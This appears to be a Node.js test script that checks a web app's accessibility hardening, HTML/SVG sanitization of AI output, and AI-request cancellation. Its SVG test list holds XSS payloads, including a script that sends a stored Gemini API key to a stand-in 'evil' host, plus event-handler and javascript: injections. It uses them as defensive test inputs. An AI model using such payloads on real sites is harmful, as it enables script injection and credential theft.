/**
 * Verify Phase 4 (hardening):
 *   M3 — focus-visible styles + keyboard access for <div onclick> controls
 *   M2 — sanitizer is a hard dependency; AI-supplied SVG is sanitized
 *   M6 — AI cancellation, concurrency guard, abort on navigate
 */

const fs = require('fs');
const path = require('path');
const vm = require('vm');

const ROOT = path.join(__dirname, '..');
const read = (p) => fs.readFileSync(path.join(ROOT, p), 'utf8');

const SANITIZER_SRC = read('js/sanitizer.js');
const APP_SRC = read('js/app.js');
const A11Y_CSS = read('css/a11y.css');
const INDEX_HTML = read('index.html');

let pass = 0, fail = 0;
function check(name, cond, detail = '') {
  if (cond) { console.log(`  PASS  ${name}`); pass++; }
  else { console.log(`  FAIL  ${name}  ${detail}`); fail++; }
}

/** Load sanitizer.js in a DOM-less sandbox using a tiny DOMParser shim. */
function loadSanitizer() {
  // A real DOM is needed for sanitizeHtml/sanitizeSvg, so lean on jsdom if
  // available; otherwise skip the runtime SVG tests and report that clearly.
  let JSDOM;
  try { ({ JSDOM } = require('jsdom')); } catch { return null; }

  const dom = new JSDOM('<!doctype html><html><body></body></html>');
  const sandbox = {
    console,
    window: dom.window,
    document: dom.window.document,
    DOMParser: dom.window.DOMParser,
    XMLSerializer: dom.window.XMLSerializer,
    Node: dom.window.Node
  };
  sandbox.globalThis = sandbox;
  vm.createContext(sandbox);
  new vm.Script(SANITIZER_SRC, { filename: 'sanitizer.js' }).runInContext(sandbox);
  return sandbox.window.SecurityUtils;
}

(async () => {
  // ================================================================= M3
  console.log('\n=== M3: focus indicators ===');
  {
    check('a11y.css exists and defines :focus-visible', /:focus-visible/.test(A11Y_CSS));
    check('stylesheet linked in index.html', /css\/a11y\.css/.test(INDEX_HTML));
    check('loaded last so it wins the cascade',
      INDEX_HTML.indexOf('css/a11y.css') > INDEX_HTML.indexOf('css/responsive.css'));
    check('light themes get an inverted halo', /\[data-theme="LIGHT"\] :focus-visible/.test(A11Y_CSS));
    check('forced-colors mode supported', /forced-colors:\s*active/.test(A11Y_CSS));
    check('reduced-motion respected', /prefers-reduced-motion/.test(A11Y_CSS));
    check('sr-only utility present', /\.sr-only/.test(A11Y_CSS));
    check('hidden dialogs removed from tab order', /visibility:\s*hidden/.test(A11Y_CSS));
  }

  console.log('\n=== M3: keyboard access for onclick elements ===');
  {
    check('enhanceInteractiveElements exists', /enhanceInteractiveElements\(root = document\)/.test(APP_SRC));
    check('delegated Enter/Space handler exists', /_setupKeyboardActivation\(\)/.test(APP_SRC));
    check('called during init', /this\._setupKeyboardActivation\(\);/.test(APP_SRC));
    check('re-applied after every render (via refreshIcons)',
      /refreshIcons\(\)[\s\S]{0,400}enhanceInteractiveElements\(\)/.test(APP_SRC));
    check('adds tabindex', /setAttribute\('tabindex',\s*'0'\)/.test(APP_SRC));
    check('adds role=button', /setAttribute\('role',\s*'button'\)/.test(APP_SRC));
    check('skips native interactive tags', /NATIVE_INTERACTIVE/.test(APP_SRC));
    check('skips backdrops/overlays', /backdrop\|overlay\|scrim/.test(APP_SRC));
    check('skips stopPropagation-only handlers', /event\\\.stopPropagation/.test(APP_SRC));
    check('prevents Space from scrolling', /e\.preventDefault\(\);\s*\n\s*el\.click\(\)/.test(APP_SRC));
    check('derives aria-label from title for icon-only controls', /aria-label/.test(APP_SRC));

    check('skip link present in markup', /class="skip-to-content"/.test(INDEX_HTML));
    check('skip link target exists', /id="main-content"/.test(INDEX_HTML));
    check('confirm dialog has role=dialog', /role="dialog"[\s\S]{0,140}modal-confirm-title/.test(INDEX_HTML));
    check('confirm dialog is aria-labelled', /aria-labelledby="modal-confirm-title"/.test(INDEX_HTML));
    check('mobile nav labelled', /class="mobile-bottom-nav" aria-label/.test(INDEX_HTML));
  }

  console.log('\n=== M3: modal focus management ===');
  {
    check('Tab is trapped inside the dialog', /if \(e\.key !== 'Tab'\) return;/.test(APP_SRC));
    check('focus restored on close', /_confirmPreviousFocus/.test(APP_SRC));
    check('Escape cancels', /if \(e\.key === 'Escape'\)/.test(APP_SRC));
  }

  // ================================================================= M2
  console.log('\n=== M2: sanitizer is a hard dependency ===');
  {
    const files = ['js/views/quiz-player.js', 'js/views/quiz-result.js', 'js/pdf-generator.js',
      'js/views/ai-teacher.js', 'js/views/answer-writing.js', 'js/views/flashcards.js'];
    let raw = 0;
    for (const f of files) {
      const m = read(f).match(/window\.SecurityUtils \?/g);
      if (m) raw += m.length;
    }
    check('no "fall back to raw content" guards remain', raw === 0, `${raw} found`);

    // marked.parse output must always be sanitized.
    let unsafeMarked = 0;
    for (const f of ['js/views/ai-teacher.js', 'js/views/answer-writing.js', 'js/pdf-generator.js']) {
      const src = read(f);
      const re = /marked\.parse\(/g;
      let m;
      while ((m = re.exec(src)) !== null) {
        const before = src.slice(Math.max(0, m.index - 80), m.index);
        if (!/sanitizeHtml\s*\(\s*$/.test(before) && !/sanitizeHtml\(window\.$/.test(before)
            && !/\/\/.*$/.test(before.split('\n').pop())) {
          unsafeMarked++;
        }
      }
    }
    check('every marked.parse() output is sanitized', unsafeMarked === 0, `${unsafeMarked} unsanitized`);
  }

  console.log('\n=== M2: AI-supplied SVG is sanitized ===');
  {
    const teacherView = read('js/views/ai-teacher.js');
    check('inline diagram uses sanitizeSvg',
      /sanitizeSvg\(exp\.diagram\.svgContent\)/.test(teacherView));
    check('fullscreen modal uses sanitizeSvg',
      /sanitizeSvg\(this\.currentExplanation\.diagram\.svgContent\)/.test(teacherView));
    check('SVG download is sanitized too',
      /const svgData = SecurityUtils\.sanitizeSvg/.test(teacherView));
    check('no raw svgContent interpolation left',
      !/\$\{exp\.diagram\.svgContent\}/.test(teacherView) &&
      !/\$\{this\.currentExplanation\.diagram\.svgContent\}/.test(teacherView));
    check('sanitizeSvg implemented', /static sanitizeSvg\(/.test(SANITIZER_SRC));
    check('SVG allow-lists defined',
      /SVG_ALLOWED_TAGS/.test(SANITIZER_SRC) && /SVG_ALLOWED_ATTRIBUTES/.test(SANITIZER_SRC));
    check('script not in SVG allow-list', !/'script'/.test(SANITIZER_SRC.split('SVG_ALLOWED_TAGS')[1]?.split('])')[0] || ''));
    check('foreignObject not allowed',
      !/foreignobject/i.test(SANITIZER_SRC.split('SVG_ALLOWED_TAGS')[1]?.split('])')[0] || ''));
  }

  console.log('\n=== M2: SVG sanitizer against real payloads ===');
  {
    const SecurityUtils = loadSanitizer();
    if (!SecurityUtils) {
      console.log('  SKIP  jsdom not installed — static checks above still cover the wiring');
    } else {
      const payloads = [
        { name: 'inline <script>', svg: `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//evil/?k='+localStorage.hamsa_gemini_api_key)</script><rect width="10" height="10"/></svg>`, mustNotContain: ['script', 'evil'] },
        { name: 'onload handler', svg: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="10" height="10"/></svg>`, mustNotContain: ['onload', 'alert'] },
        { name: 'onclick on child', svg: `<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="alert(1)" width="10" height="10"/></svg>`, mustNotContain: ['onclick', 'alert'] },
        { name: 'foreignObject HTML', svg: `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body><img src=x onerror="alert(1)"></body></foreignObject></svg>`, mustNotContain: ['foreignObject', 'onerror'] },
        { name: 'javascript: href on <a>', svg: `<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>`, mustNotContain: ['javascript:'] },
        { name: 'xlink:href external use', svg: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="//evil/x.svg#a"/></svg>`, mustNotContain: ['use', 'evil'] },
        { name: 'animate to javascript:', svg: `<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="href" to="javascript:alert(1)"/></a></svg>`, mustNotContain: ['animate', 'javascript:'] },
        { name: '<style> with url()', svg: `<svg xmlns="http://www.w3.org/2000/svg"><style>rect{fill:url(//evil/x)}</style><rect width="10" height="10"/></svg>`, mustNotContain: ['style>', 'evil'] },
        { name: 'set element', svg: `<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onload" to="alert(1)"/></svg>`, mustNotContain: ['set', 'onload'] },
        { name: 'handler element', svg: `<svg xmlns="http://www.w3.org/2000/svg"><handler>alert(1)</handler></svg>`, mustNotContain: ['handler', 'alert'] }
      ];

      for (const p of payloads) {
        const out = SecurityUtils.sanitizeSvg(p.svg) || '';
        const leaked = p.mustNotContain.filter(bad => out.toLowerCase().includes(bad.toLowerCase()));
        check(`blocks ${p.name}`, leaked.length === 0, `leaked: ${leaked.join(',')} -> ${out.slice(0, 120)}`);
      }

      // Legitimate diagrams must survive.
      const good = `<svg viewBox="0 0 500 180" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"><stop offset="0%" stop-color="#4F46E5"/><stop offset="100%" stop-color="#06B6D4"/></linearGradient></defs><rect x="30" y="50" width="120" height="70" rx="12" fill="url(#g)"/><text x="90" y="90" font-size="14" text-anchor="middle" fill="#fff">Input</text><path d="M 155 85 L 205 85" stroke="#F59E0B" stroke-width="3"/></svg>`;
      const cleaned = SecurityUtils.sanitizeSvg(good);
      check('keeps legitimate shapes', /<rect/.test(cleaned) && /<text/.test(cleaned) && /<path/.test(cleaned));
      check('keeps gradients', /linearGradient/i.test(cleaned) && /<stop/i.test(cleaned));
      check('keeps text content', /Input/.test(cleaned));
      check('normalises width to 100%', /width="100%"/.test(cleaned));
      check('forces a viewBox', /viewBox=/i.test(cleaned));

      // Non-SVG and malformed input.
      check('rejects non-SVG input', SecurityUtils.sanitizeSvg('<div>hi</div>') === '');
      check('rejects malformed XML', SecurityUtils.sanitizeSvg('<svg><rect>') === '');
      check('handles empty input', SecurityUtils.sanitizeSvg('') === '' && SecurityUtils.sanitizeSvg(null) === '');
      check('rejects an HTML-smuggling attempt',
        SecurityUtils.sanitizeSvg('<img src=x onerror=alert(1)><svg></svg>') === '');
    }
  }

  // ================================================================= M6
  console.log('\n=== M6: cancellation and concurrency ===');
  {
    check('beginGeneration exists', /beginGeneration\(label/.test(APP_SRC));
    check('endGeneration exists', /endGeneration\(\)\s*\{/.test(APP_SRC));
    check('cancelGeneration exists', /cancelGeneration\(\)\s*\{/.test(APP_SRC));
    check('cancel aborts in-flight requests', /cancelGeneration[\s\S]{0,400}aiClient\.abortAll\(\)/.test(APP_SRC));
    check('concurrent generation refused', /if \(this\._isGenerating\)/.test(APP_SRC));
    check('cancel button in overlay markup', /id="generating-cancel-btn"/.test(INDEX_HTML));
    check('cancel button wired to app.cancelGeneration', /onclick="app\.cancelGeneration\(\)"/.test(INDEX_HTML));
    check('navigate aborts orphaned AI requests',
      /viewName !== this\.currentView && window\.aiClient\?\.inFlightCount > 0/.test(APP_SRC));

    // Callers must use the lifecycle rather than poking the overlay directly.
    const cq = read('js/views/create-quiz.js');
    check('create-quiz uses beginGeneration', /app\.beginGeneration\(/.test(cq));
    check('create-quiz uses endGeneration', /app\.endGeneration\(\)/.test(cq));
    check('create-quiz suppresses the cancel "error" toast', /isGenerationCancelled\(\)/.test(cq));
    check('create-quiz no longer toggles the overlay directly',
      !/overlay\.classList/.test(cq));
    // Check within each method body rather than a fixed character window.
    const bodyAfter = (marker) => {
      const i = APP_SRC.indexOf(marker);
      return i === -1 ? '' : APP_SRC.slice(i, i + 2500);
    };
    check('launchQuickDrill uses the lifecycle',
      /beginGeneration\(/.test(bodyAfter('async launchQuickDrill()')));
    check('launchMockTest uses the lifecycle',
      /beginGeneration\(/.test(bodyAfter('async launchMockTest()')));
    // endGeneration() is the one legitimate place that touches the overlay.
    const overlayToggles = (APP_SRC.match(/overlay\.classList\.(add|remove)\('active'\)/g) || []).length;
    check('overlay toggling is centralised in begin/endGeneration',
      overlayToggles === 2, `${overlayToggles} direct toggles`);

    // ai-client already provides the primitives (built in Phase 1).
    const client = read('js/ai-client.js');
    check('aiClient exposes abortAll', /abortAll\(\)\s*\{/.test(client));
    check('aiClient tracks in-flight count', /get inFlightCount\(\)/.test(client));
    check('aiClient enforces a timeout', /timedOut/.test(client));
  }

  console.log(`\nRESULT: ${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
})();
